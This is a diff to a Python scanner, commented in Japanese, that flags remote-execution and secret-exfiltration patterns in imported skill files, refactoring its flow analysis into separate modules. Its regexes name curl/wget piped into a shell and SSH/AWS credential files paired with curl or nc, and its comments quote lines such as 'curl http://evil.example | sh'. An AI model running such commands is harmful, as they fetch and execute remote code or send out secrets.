@@ -28,6 +28,22 @@ from dataclasses import dataclass, field
 from pathlib import Path
 from typing import List, Optional, Pattern, Tuple
 
+from skill_vuln_flow import (
+    FLOW_FETCH_TO_FILE as _FLOW_FETCH_TO_FILE,
+    NET_SINK as _NET_SINK,
+    SECRET_SOURCE as _SECRET_SOURCE,
+    FlowFinding,
+    detect_flows_in_scope as _detect_flows_in_scope_impl,
+    iter_scopes as _iter_scopes,
+    mask_placeholder_tokens as _mask_placeholder_tokens,
+)
+from skill_vuln_shell import (
+    compute_heredoc_zones as _compute_heredoc_zones,
+    compute_shell_scope_lines as _compute_shell_scope_lines_impl,
+    effective_shell_text as _effective_shell_text,
+    join_logical_lines as _join_logical_lines,
+)
+
 # 走査対象拡張子（.py は本 PR 対象外＝FP 抑制。follow-up で別途）。
 # #537 round4 是正（レビュー I3）: `.mdx`/`.markdown`/`.txt`/`.rst` は `.md` と同じ
 # 人間可読文書でありながら旧実装では最初から拡張子フィルタで捨てられ、
@@ -123,7 +139,10 @@ _PATTERNS: List[Tuple[str, str, str, Pattern[str]]] = [
         "remote_exec.curl_pipe_sh",
         "remote_exec",
         "HIGH",
-        re.compile(r"(?i)\b(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?(ba|z|k|d|a)?sh\b"),
+        re.compile(
+            r"(?i)\b(curl|wget|fetch)\b[^\n|]*\|\s*(sudo\s+)?"
+            r"(?:ba|z|k|d|da|a)?sh\b"
+        ),
     ),
     (
         # base64 -d 単体は非検出。shell へパイプする combo のみ。
@@ -137,6 +156,15 @@ _PATTERNS: List[Tuple[str, str, str, Pattern[str]]] = [
         "remote_exec",
         "HIGH",
         re.compile(r"(?i)\b(curl|wget)\b[^\n]*\b-o\b[^\n]*&&[^\n]*\b(ba)?sh\b"),
+    ),
+    (
+        "remote_exec.shell_c_command_substitution",
+        "remote_exec",
+        "HIGH",
+        re.compile(
+            r"(?i)\b(?:ba|z|k|d|a)?sh\b[^\n]*?\s-c\b[^\n]*?"
+            r"\$\([^)]*\b(?:curl|wget|fetch)\b"
+        ),
     ),
     # destructive / MEDIUM
     (
@@ -220,13 +248,6 @@ _PATTERNS: List[Tuple[str, str, str, Pattern[str]]] = [
     ),
 ]
 
-# secret_exfil は「秘密ソース」+「ネット sink」の同一行共起でのみ検出する（特殊判定）。
-_SECRET_SOURCE = re.compile(
-    r"(?i)(~/\.ssh/id_|\.aws/credentials|id_rsa|\.env\b|printenv\b|\benv\b\s*\|)"
-)
-_NET_SINK = re.compile(r"(?i)(\bcurl\b|\bwget\b|\bnc\b|https?://)")
-
-
 @dataclass(frozen=True)
 class Finding:
     """1 件の脆弱性ヒット。
@@ -245,38 +266,6 @@ class Finding:
     severity: str
     pattern_id: str
     snippet: str
-
-
-@dataclass(frozen=True)
-class FlowFinding:
-    """静的フロー解析（マルチステップ攻撃系列・#123）が検出した 1 件の順序ペア。
-
-    行単位の Finding と違い、各行単体では benign だが「fetch→exec」「read→exfil」の
-    順序で組み合わさると悪性になる系列を表す。producer（fetch/read 行）→ consumer
-    （exec/送信行）を 2 つの行番号で示す。**producer/consumer は常に同一ファイル内**
-    （rel_path 1 本で両方の行を指す設計自体がそれを表す）。別ファイルに分散する
-    producer/consumer は検出しない（意図的なスコープ境界。ファイルをまたぐ解析はしない）。
-
-    rel_path:          root からの POSIX 相対パス
-    producer_line:     fetch/read 行（1 始まり）
-    consumer_line:     exec/送信行（1 始まり・producer より後）
-    category:          remote_exec_flow / secret_exfil_flow
-    severity:          HIGH（系列注入は高リスク）
-    pattern_id:        マッチした系列 pattern の識別子
-    var:               producer と consumer を繋ぐキー（変数名 or ダウンロード先ファイル）
-    producer_snippet:  producer 行の strip 済み snippet
-    consumer_snippet:  consumer 行の strip 済み snippet
-    """
-
-    rel_path: str
-    producer_line: int
-    consumer_line: int
-    category: str
-    severity: str
-    pattern_id: str
-    var: str
-    producer_snippet: str
-    consumer_snippet: str
 
 
 @dataclass
@@ -659,409 +648,6 @@ def _scan_line(
     return found
 
 
-# ============================================================================
-# 静的フロー解析（マルチステップ攻撃系列の順序ペア検出・#123）— 追加のみ
-# ----------------------------------------------------------------------------
-# 行単位スキャン（_scan_line）はステートレスで「行 A（fetch）→ 行 B（exec）」の
-# 系列を追えない。ここでは**同一ファイル内**（スコープはフェンス記法を問わずファイル
-# 全体・後述）で、fetch 系がバインドした名前（変数 or ダウンロード先ファイル）が後続行
-# の exec/送信ポジションで参照される順序ペアを決定論検出する。**producer/consumer が
-# 別ファイルに分かれるケースは意図的にスコープ外**（skill 1 件が複数ファイルへ
-# fetch/exec を分散させる攻撃は非検出。ファイル境界を越えた解析はしない）。
-# 完全なデータフロー解析はせず、同名の代入→参照・コマンド置換・-o/> のファイル
-# 受け渡しのみ最小限に追う（combo 必須方針の系列版）。
-#
-# FP 抑制の要:
-# - producer は「fetch/read をコマンド置換で変数に束ねる」or「-o/> でファイルに
-#   落とす」のみ登録する（bare な取得は非登録）。
-# - consumer は変数を **コードとして** 実行する形（eval / -c / <<< / `| sh`）だけ拾い、
-#   引数渡し（`bash local.sh "$V"`）は除外する。ダウンロードファイルは interpreter
-#   直後（`bash FILE` / `./FILE` / `source FILE` / `chmod +x FILE`）のみ。
-# - producer は consumer より前の行に限る（同一行 self-loop は登録を後回しにして排除）。
-# - スコープはフェンス内外を問わず全行（#415 型再発の是正: 4スペース字下げ / `~~~` /
-#   `<details>` / フェンス無し本文が非検出だった）。行番号距離の上限は設けない
-#   （#415 追補: 距離キャップは「上限を超える行数だけ離せば検出を回避できる」新たな
-#   迂回経路そのものであり、allowlist/除外リストと同じ骨抜き構造になる。導入時に
-#   検出された FP の真因は _FLOW_FETCH_TO_FILE 側の `>` 誤認識バグであり、そちらを
-#   修正した結果、距離キャップ無しでも 67 roots 実コーパスで新規誤検出は0件だった）。
-# ============================================================================
-
-# fetch 系ネットワーク取得コマンド（gh api を含む）。
-_FLOW_FETCH_CMD = re.compile(r"(?i)(\b(?:curl|wget|fetch)\b|\bgh\s+api\b)")
-
-# コマンド置換の存在（$( ... ) or `...`）。
-_FLOW_CMD_SUBST = re.compile(r"\$\(|`")
-
-# VAR=... 代入（先頭の変数名を捕捉。export 許容）。
-_FLOW_ASSIGN = re.compile(r"^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=(.*)$")
-
-# fetch のダウンロード先ファイルを捕捉（-o/-O/--output/>/>>）。
-# `<account_id>` のような山括弧プレースホルダ全体を先に同じ長さの `#` へマスクしてから
-# マッチさせる（#415 追補2: 直前空白必須の lookbehind で誤認識を抑えた版は、
-# `curl url>file` や stderr redirect `curl url 2>file` のような、bash として正当かつ
-# 直前が空白でない redirect 記法を検出できなくする回帰を生んでいた実測がある — 変異
-# 試験で両方とも flow_findings=[] のまま素通りすることを確認済み。プレースホルダの
-# 識別は「直前が空白でないこと」ではなく「`<...>` に囲まれた語であること」で行う方が
-# 誤認識の真因に近く、redirect 記法の空白有無に依存しない）。
-_PLACEHOLDER_TOKEN = re.compile(r"<[A-Za-z0-9_.-]+>")
-
-_FLOW_FETCH_TO_FILE = re.compile(
-    r"(?i)\b(?:curl|wget|fetch)\b[^\n]*?"
-    r"(?:-o|-O|--output|>>?)\s*['\"]?([^\s'\"|;&><`]+)"
-)
-
-
-def _mask_placeholder_tokens(text: str) -> str:
-    """`<account_id>` 等の山括弧プレースホルダを同じ長さの `#` でマスクする。
-
-    `_FLOW_FETCH_TO_FILE` がプレースホルダ内の `>` を redirect と誤認しないための
-    前処理。キャプチャ位置・行文字列の長さを変えず、マスク後の文字列でのみ検索する
-    （元の `text` はスニペット表示や他 regex に引き続き使う）。
-    """
-    return _PLACEHOLDER_TOKEN.sub(lambda m: "#" * len(m.group(0)), text)
-
-# ダウンロード先として登録しない sink（/dev 系・stdout 記法）。
-_FLOW_FILE_IGNORE = {"-", "/dev/null", "/dev/stdout", "/dev/stderr"}
-
-# 変数を「コードとして」実行する形（引数渡しは除外＝FP 抑制）。{ref} に変数参照を埋める。
-_EXEC_VAR_FORM_TEMPLATES = [
-    r"(?i)\beval\b[^\n]*{ref}",  # eval "$V"
-    # bash -c "$V" / sh -c / python -c / node -e / perl -e / ruby -e
-    r"(?i)\b(?:(?:ba|z|k|d|a)?sh|python3?|node|perl|ruby)\b[^\n]*?\s-(?:c|e)\b[^\n]*{ref}",
-    # bash <<< "$V" / python3 <<< "$V"
-    r"(?i)\b(?:(?:ba|z|k|d|a)?sh|python3?)\b[^\n]*?<<<[^\n]*{ref}",
-    # echo "$V" | sh   （変数参照が pipe より前、shell が後）
-    r"(?i){ref}[^\n]*\|\s*(?:sudo\s+)?(?:ba|z|k|d|a)?sh\b",
-]
-
-
-def _var_ref_pattern(var: str) -> str:
-    """$VAR / ${VAR} の参照を表す regex 断片（後続が識別子文字でないこと）。"""
-    return r"\$\{?" + re.escape(var) + r"(?![A-Za-z0-9_])"
-
-
-def _exec_var_regexes(var: str) -> List[Pattern[str]]:
-    """変数 var を「コードとして」実行する consumer 行を判定する regex 群。"""
-    ref = _var_ref_pattern(var)
-    return [re.compile(t.format(ref=ref)) for t in _EXEC_VAR_FORM_TEMPLATES]
-
-
-def _exec_file_regexes(fpath: str) -> List[Pattern[str]]:
-    """ダウンロード済みファイル fpath を実行する consumer 行を判定する regex 群。"""
-    ref = re.escape(fpath)
-    base = re.escape(fpath.rsplit("/", 1)[-1])
-    return [
-        # bash FILE / sh FILE / source FILE / python FILE（flag を挟んでも可、直後の位置）
-        re.compile(
-            r"(?i)\b(?:(?:ba|z|k|d|a)?sh|source|python3?|node|perl|ruby)\s+"
-            r"(?:-\S+\s+)*['\"]?" + ref
-        ),
-        re.compile(r"(?i)(?:^|;|&&|\|\|)\s*\.\s+['\"]?" + ref),  # . FILE（source 短縮）
-        # ./FILE（basename 実行）— コマンド境界（^ / ; / & / | / ( / `）直後のみ。
-        # 引数位置（`rm -rf ./x.deb` / `hdiutil attach ./x.dmg`）は非検出＝FP 抑制。
-        re.compile(r"(?i)(?:^|[;&|(`])\s*\./" + base + r"\b"),
-        re.compile(r"(?i)\bchmod\s+\+x\b[^\n]*" + ref),  # chmod +x FILE（実行準備）
-    ]
-
-
-def _detect_flows_in_scope(
-    rel_path: str,
-    scope_lines: List[Tuple[int, str]],
-    literal_zone: "set | None" = None,
-    shell_scope: "set | None" = None,
-) -> List[FlowFinding]:
-    """1 スコープ内の fetch→exec / read→exfil 順序ペアを検出する（決定論）。
-
-    literal_zone: `_compute_literal_zone_lines` が返す行番号集合。含まれる行は
-    フェンスコード/frontmatter 内なので装飾除去を適用しない（#537 round3）。
-    shell_scope: `_compute_shell_scope_lines`/`.sh`/`.bash` 全体行番号集合。
-    含まれる行は shell comment 除去（`_effective_shell_text`）を照合前に適用する
-    （#537 round9 レビュー J3: `# curl http://evil.example > payload.sh` の
-    ようなコメント行が `remote_exec_flow.fetch_file_to_exec` を誤検出していた
-    ため、フロー解析側にも comment 除去を適用する）。
-    """
-    found: List[FlowFinding] = []
-    fetch_vars: dict[str, Tuple[int, str]] = {}
-    fetch_files: dict[str, Tuple[int, str]] = {}
-    secret_vars: dict[str, Tuple[int, str]] = {}
-    literal_zone = literal_zone or set()
-    shell_scope = shell_scope or set()
-
-    for lineno, text in scope_lines:
-        # shell comment 除去（#537 round9 J3）は Markdown 装飾除去・NFKC より
-        # 先に、shell scope 内の行にのみ適用する（`#` は shell comment だが
-        # Markdown では見出し記法であり、shell scope 外で剥がすと見出し中の
-        # combo を握りつぶす誤りになるため scope を必ず限定する）。
-        effective_text = _effective_shell_text(text) if lineno in shell_scope else text
-        # 装飾（blockquote `>` / リストマーカー等）を剥がした版で照合する
-        # （#537 round2: `> D=$(...)` が _FLOW_ASSIGN の `^` アンカーに一致せず
-        # 素通りしていた。snippet 表示には元の text を使う＝装飾を消さない）。
-        # literal zone（フェンスコード内/frontmatter 内）では Markdown マーカー
-        # 除去だけ剥がさない（#537 round3: そこでの `-`/`>` は diff の削除行・
-        # YAML sequence・シェルのリダイレクトであり Markdown 装飾ではないため）。
-        # Cf/Mn/Me 除去 + NFKC 正規化は literal zone でも適用する（#537 round6:
-        # フェンス内の不可視文字・homoglyph 偽装も同じ攻撃面のため）。
-        norm = (
-            _normalize_for_matching(effective_text)
-            if lineno in literal_zone
-            else _strip_leading_decoration(effective_text)
-        )
-
-        # 1) consumer 判定は既登録 producer に対してのみ（＝producer 先行を強制）。
-        for var, (pl, psnip) in fetch_vars.items():
-            if any(rx.search(norm) for rx in _exec_var_regexes(var)):
-                found.append(
-                    FlowFinding(
-                        rel_path, pl, lineno, "remote_exec_flow", "HIGH",
-                        "remote_exec_flow.fetch_var_to_exec", var, psnip, _snippet(text),
-                    )
-                )
-        for fpath, (pl, psnip) in fetch_files.items():
-            if any(rx.search(norm) for rx in _exec_file_regexes(fpath)):
-                found.append(
-                    FlowFinding(
-                        rel_path, pl, lineno, "remote_exec_flow", "HIGH",
-                        "remote_exec_flow.fetch_file_to_exec", fpath, psnip, _snippet(text),
-                    )
-                )
-        for var, (pl, psnip) in secret_vars.items():
-            if re.search(_var_ref_pattern(var), norm) and _NET_SINK.search(norm):
-                found.append(
-                    FlowFinding(
-                        rel_path, pl, lineno, "secret_exfil_flow", "HIGH",
-                        "secret_exfil_flow.read_var_to_net", var, psnip, _snippet(text),
-                    )
-                )
-
-        # 2) producer 登録は consumer 判定の後（同一行 self-loop を防ぐ）。
-        m = _FLOW_ASSIGN.match(norm)
-        if m:
-            var, rhs = m.group(1), m.group(2)
-            if _FLOW_CMD_SUBST.search(rhs):
-                if _FLOW_FETCH_CMD.search(rhs):
-                    fetch_vars.setdefault(var, (lineno, _snippet(text)))
-                if _SECRET_SOURCE.search(rhs):
-                    secret_vars.setdefault(var, (lineno, _snippet(text)))
-        fm = _FLOW_FETCH_TO_FILE.search(_mask_placeholder_tokens(norm))
-        if fm:
-            fpath = fm.group(1)
-            if fpath and fpath not in _FLOW_FILE_IGNORE:
-                fetch_files.setdefault(fpath, (lineno, _snippet(text)))
-
-    return found
-
-
-def _iter_scopes(path: Path, text: str) -> List[List[Tuple[int, str]]]:
-    """フロー解析のスコープを列挙する。
-
-    拡張子・フェンス記法（``` / ~~~ / 4スペース字下げ / `<details>` / フェンス無し
-    本文）を問わずファイル全体を 1 スコープとする（#415: フェンス限定 scope は
-    4スペース字下げ・`~~~`・`<details>`・素の本文の combo を素通りさせていた）。
-    **スコープは常に単一ファイル（同一ファイル内）に限定される**（呼び出し元
-    `scan_skills` がファイル単位で `_iter_scopes` を呼ぶ設計そのものが境界）。
-    別ファイルにまたがる producer/consumer は検出対象外（意図的なスコープ境界）。
-    行番号距離の上限は設けない（#415 追補: 距離キャップ自体が「超えれば回避できる」
-    迂回経路になるため撤廃。producer/consumer 誤連鎖の真因は _FLOW_FETCH_TO_FILE
-    側の regex を修正して解消した）。行番号は原文基準で保持。
-    """
-    lines = text.splitlines()
-    return [list(enumerate(lines, start=1))]
-
-
-# ============================================================================
-# シェル論理行の結合（物理改行によるパターン分断の是正・#537 round7 レビュー I5）
-# ----------------------------------------------------------------------------
-# シェルは行末が `|`（バックスラッシュ無しでも次行をパイプライン継続として読む）
-# または `\`（明示的な行継続）で終わると、複数の物理行を 1 つの論理行として実行
-# する。`_scan_line` は行単位 regex（同一行 combo 前提）のため、
-#     curl http://evil.example |
-#     sh
-# のように combo を 2 物理行に分断されると `remote_exec.curl_pipe_sh` を検出
-# できない（bash は 1 パイプラインとして実行する一方、scanner は両方とも []。
-# レビュー実測 #537 round7 I5）。
-#
-# 「シェル上どこで論理行が区切れるか」の判定を本節に集約する（1箇所で完結させる
-# 設計＝レビュー指示）。今回実装するのは末尾 `|`・末尾 `\` の2種のみだが、
-# `&&`/`||`/`;`/ヒアドキュメント/複数行 `$( )` 等を今後追加する場合も
-# `_is_shell_continuation` と `_join_logical_lines` の2関数だけを変更すれば足りる
-# 構造にする（個別の記号を検出箇所ごとに1つずつ足す実装にしない）。
-#
-# 適用範囲は `.sh`/`.bash` ファイル全体、および Markdown 内のシェル系 fenced code
-# block（info string が sh/bash/zsh/ksh/dash/shell/console のいずれか）の中身に限定
-# する。Markdown の表（`| col1 | col2 |`）は `|` を多用するため、シェルスコープ外
-# では本結合を適用しない（陽性対照: 表を誤って論理行結合しない）。
-# ============================================================================
-
-_SHELL_FENCE_INFO = {"sh", "bash", "zsh", "ksh", "dash", "shell", "console"}
-_TRAILING_PIPE_RE = re.compile(r"\|\s*$")
-_TRAILING_BACKSLASH_RE = re.compile(r"\\\s*$")
-
-
-def _effective_shell_text(stripped_line: str) -> str:
-    """行のうち shell comment（クォート外・語頭の `#` 以降）を除いた「実際に
-    実行される部分」を返す。**「どこでコマンドが切れるか」を判定する唯一の
-    入口**（#537 round8/round9 レビュー I7/J2/J3/K1 是正）。継続判定
-    （`_is_shell_continuation`）・結合（`_join_logical_lines`）・行単位の
-    パターン照合（`scan_skills` の呼び出し側）は必ずこの関数の出力に対して
-    行い、コメント記号を後付けで個別に足す実装にしない。
-
-    完全な shell parser は実装しない（round9 レビューの明示的な指示:
-    過剰実装を避け、判定に自信が持てない構文（`$( )` コマンド置換内部・
-    ANSI-C クォート `$'...'`・heredoc 本文 等）は「コメントとして誤って
-    消さない」側＝**検査対象に残す**側へ倒す。見落とし（false negative）
-    より過剰検出（false positive）の方が安全＝advisory なのでコストが低い）。
-
-    POSIX の comment 規則を最小限反映する: `#` がコメントを開始するのは
-    ①クォート外 ②直前の文字がバックスラッシュでエスケープされていない
-    ③**行頭、または直前の文字が空白**（＝語の先頭）の場合のみ。単語の
-    途中に現れる `#`（例: URL フラグメント `http://x/#frag`）はコメントでは
-    ない。
-
-    round8 での既知の欠陥（round9 レビューが実測）:
-    - J2（見落とし）: 旧実装はクォート外の `#` を無条件にコメント開始と
-      誤認しており、`curl http://x/#frag |` のような URL フラグメント中の
-      `#` で末尾 `|` ごと切り捨てられ、継続を検出できなかった。
-    - K1（誤検出）: `curl http://x/\\#frag`（バックスラッシュでエスケープ
-      された `#`）も同様にコメント開始と誤認して切り捨て、残った末尾の `\\`
-      を行継続と誤認して次行の `| sh` と合成し、実在しない combo を報告
-      していた（この入力は `bash -n` で構文エラーになる無効な組合せだった）。
-    どちらも「語頭でない `#` はコメントではない」「エスケープされた `#` は
-    コメントではない」という同じ POSIX 規則で解消する。
-
-    #537 round9 追加探索（自己発見）: 語頭判定を「直前が空白文字か」だけで行うと、
-    `curl http://x;# comment |` のようにシェル演算子（`;`/`&`/`|`/`(`/`)`/`<`/
-    `>`）の直後に空白無しで `#` が続くケースを見落とす（POSIX 上、演算子も
-    語の境界を作るため `#` はコメント開始のはずだが、演算子は `isspace()` で
-    False になるため誤って「語の途中」と判定してしまい、コメントを除去できず
-    末尾 `|` が残って誤検出になっていた）。語頭判定を「直前が空白文字、または
-    シェル演算子文字」に拡張して解消する。
-    """
-    in_single = False
-    in_double = False
-    # シェル演算子文字（`;`/`&`/`|`/`(`/`)`/`<`/`>`）も空白と同様に語の境界を
-    # 作る（POSIX: これらの直後に続く `#` も語頭でありコメント開始になる）。
-    _boundary_chars = ";&|()<>"
-    prev_is_boundary = True  # 行頭は「直前が境界」として扱う（語頭判定の起点）。
-    i = 0
-    n = len(stripped_line)
-    while i < n:
-        ch = stripped_line[i]
-        if ch == "\\" and not in_single:
-            # シングルクォート外のバックスラッシュは次の1文字をエスケープする
-            # （`\\#` は文字としての `#`、`\\"` は文字としての `"` 等）。エスケープ
-            # された文字は quote 状態にもコメント判定にも影響させず読み飛ばす。
-            i += 2
-            prev_is_boundary = False
-            continue
-        if ch == "'" and not in_double:
-            in_single = not in_single
-            prev_is_boundary = False
-            i += 1
-            continue
-        if ch == '"' and not in_single:
-            in_double = not in_double
-            prev_is_boundary = False
-            i += 1
-            continue
-        if ch == "#" and not in_single and not in_double and prev_is_boundary:
-            return stripped_line[:i]
-        prev_is_boundary = ch.isspace() or ch in _boundary_chars
-        i += 1
-    return stripped_line
-
-
-def _is_shell_continuation(stripped_line: str) -> bool:
-    """行が次の物理行へ継続するシェル論理行の一部かどうか（末尾 `|` または `\\`）。
-    判定は comment を除いた実効テキスト（`_effective_shell_text`）に対して行う。
-    """
-    effective = _effective_shell_text(stripped_line)
-    return bool(
-        _TRAILING_PIPE_RE.search(effective) or _TRAILING_BACKSLASH_RE.search(effective)
-    )
-
-
-def _compute_shell_scope_lines(lines: List[str]) -> set:
-    """行番号（1始まり）の集合を返す。Markdown 内のシェル系 fenced code block
-    （info string が `_SHELL_FENCE_INFO`）の**中身**の行のみを対象とする
-    （fence マーカー行自体は含めない）。フェンス判定は `_compute_literal_zone_lines`
-    と同じ「同種・同じ長さ以上の closer が実際に見つかった場合のみ閉じたとみなす」
-    原則を再利用する（未閉じフェンスはスコープに含めず、以降のフェンス走査も
-    打ち切る）。
-    """
-    scope: set = set()
-    n = len(lines)
-    stripped_lines = [raw.rstrip("\r\n") for raw in lines]
-    idx = 0
-    while idx < n:
-        opener = _match_fence_opener(stripped_lines[idx])
-        if opener is None:
-            idx += 1
-            continue
-        ch, min_len = opener
-        m = _FENCE_OPENER.match(stripped_lines[idx])
-        info = m.group(2) if m else ""
-        info_word = info.strip().split()[0].lower() if info.strip() else ""
-        close_at = None
-        for j in range(idx + 1, n):
-            if _match_fence_closer(stripped_lines[j], ch, min_len):
-                close_at = j
-                break
-        if close_at is None:
-            # 未閉じ: スコープを作らず、以降のフェンス走査自体を打ち切る
-            # （`_compute_literal_zone_lines` と同方針）。
-            break
-        if info_word in _SHELL_FENCE_INFO:
-            for k in range(idx + 1, close_at):
-                scope.add(k + 1)
-        idx = close_at + 1
-    return scope
-
-
-def _join_logical_lines(
-    lines: List[str], scope_linenos: set
-) -> List[Tuple[int, str]]:
-    """scope_linenos（1始まり）に属する行のうち、シェル継続で分割された物理行を
-    1つの論理行へ結合する。戻り値は (先頭物理行番号, 結合済みテキスト) のリスト
-    （継続していない行は含めない — 呼び出し側は既存の物理行単位スキャンに
-    **追加**して使う設計で、単独行スキャンを置き換えない）。
-
-    結合する内容は各行の `_effective_shell_text`（comment 除去後）を使う
-    （#537 round8 レビュー I7 是正）。comment だけ・空行になった中間行は
-    「透過的にスキップ」する（bash 上、コメント行はパイプ継続の状態を変えず
-    次の非コメント行へ読み進むため）。
-
-    末尾 `|` は結合後の照合に `|` 自体が必要なため残したまま次行を連結する。
-    末尾 `\\`（行継続）は記号自体を落として連結する（シェル上は改行が消えるだけで
-    バックスラッシュはコマンドの一部ではないため）。
-    """
-    out: List[Tuple[int, str]] = []
-    n = len(lines)
-    idx = 0
-    while idx < n:
-        lineno = idx + 1
-        stripped = lines[idx].rstrip("\r\n")
-        if lineno not in scope_linenos or not _is_shell_continuation(stripped):
-            idx += 1
-            continue
-        start_lineno = lineno
-        buf = _effective_shell_text(stripped)
-        j = idx + 1
-        while _is_shell_continuation(buf) and j < n and (j + 1) in scope_linenos:
-            nxt_effective = _effective_shell_text(lines[j].rstrip("\r\n"))
-            if not nxt_effective.strip():
-                # comment のみ・空行: 継続状態を保ったまま透過的にスキップする。
-                j += 1
-                continue
-            if _TRAILING_BACKSLASH_RE.search(buf):
-                buf = _TRAILING_BACKSLASH_RE.sub("", buf).rstrip() + " " + nxt_effective.strip()
-            else:
-                buf = buf.rstrip() + " " + nxt_effective.strip()
-            j += 1
-        out.append((start_lineno, buf))
-        idx = j
-    return out
-
-
 def scan_skills(root: Path) -> SkillVulnReport:
     """root/skills/ 配下の取り込みスキルを静的スキャンして脆弱性 Finding を返す（決定論）。"""
     root = Path(root)
@@ -1104,24 +690,41 @@ def scan_skills(root: Path) -> SkillVulnReport:
         shell_scope = (
             set(range(1, len(lines) + 1))
             if path.suffix.lower() in (".sh", ".bash")
-            else _compute_shell_scope_lines(lines)
+            else _compute_shell_scope_lines_impl(
+                lines, _match_fence_opener, _match_fence_closer
+            )
+        )
+        _, data_heredoc_zone = _compute_heredoc_zones(
+            lines, shell_scope
         )
         existing_keys: set = set()
         for idx, line in enumerate(lines, start=1):
+            if idx in data_heredoc_zone:
+                continue
             effective_line = _effective_shell_text(line) if idx in shell_scope else line
             for f in _scan_line(rel, idx, effective_line, idx in literal_zone):
                 findings.append(f)
                 existing_keys.add((f.line, f.pattern_id))
         for scope in _iter_scopes(path, text):
             flow_findings.extend(
-                _detect_flows_in_scope(rel, scope, literal_zone, shell_scope)
+                _detect_flows_in_scope_impl(
+                    rel,
+                    [item for item in scope if item[0] not in data_heredoc_zone],
+                    literal_zone,
+                    shell_scope - data_heredoc_zone,
+                    _normalize_for_matching,
+                    _strip_leading_decoration,
+                    _snippet,
+                )
             )
 
         # #537 round7 是正（レビュー I5）: シェル継続行（末尾 `|`・`\`）で
         # 物理分断された combo を論理行へ結合してから追加スキャンする。
         # 既存の物理行単位スキャン（上）を置き換えず、そこで未検出だった
         # (行, pattern_id) の組だけを追加する（重複 Finding を作らない）。
-        for start_lineno, joined_text in _join_logical_lines(lines, shell_scope):
+        for start_lineno, joined_text in _join_logical_lines(
+            lines, shell_scope - data_heredoc_zone
+        ):
             for f in _scan_line(
                 rel, start_lineno, joined_text, start_lineno in literal_zone
             ):
